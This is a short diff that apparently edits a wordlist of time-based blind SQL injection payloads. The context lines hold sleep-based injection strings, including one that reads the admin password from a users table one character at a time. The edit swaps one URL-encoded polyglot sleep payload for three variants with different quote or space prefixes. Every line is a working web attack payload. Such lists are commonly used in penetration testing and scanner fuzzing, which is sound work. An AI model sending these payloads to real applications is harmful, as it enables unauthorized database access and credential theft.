@@ -1014,4 +1014,7 @@ SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)
 (SELECT(0)FROM(SELECT(SLEEP(8)))a)
 'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(9) ELSE 0 END)XOR'Z
 zerodiumsleep(10);
- (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+"(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+%20(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+'(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+
